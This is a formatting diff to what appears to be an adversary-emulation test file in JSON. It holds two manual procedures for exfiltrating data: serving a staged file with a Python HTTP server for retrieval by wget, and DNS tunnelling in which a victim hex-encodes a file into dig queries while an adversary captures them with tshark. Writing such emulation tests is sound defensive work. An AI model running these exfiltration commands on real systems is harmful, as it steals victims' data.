@@ -12,7 +12,7 @@
       "executor": {
         "name": "manual",
         "elevation_required": false,
-        "procedure": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n\n\n\n\n\n\n\n<br/>\n<br/>"
+        "procedure": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt"
       },
       "input_arguments": [],
       "auto_generated_guid": "1d1abbd6-a3d3-4b2e-bef5-c59293f46eff"
@@ -53,7 +53,7 @@
       "executor": {
         "name": "manual",
         "elevation_required": false,
-        "procedure": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n\n\n\n\n\n\n\n<br/>\n<br/>"
+        "procedure": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r"
       },
       "input_arguments": [],
       "auto_generated_guid": "c403b5a4-b5fc-49f2-b181-d1c80d27db45"
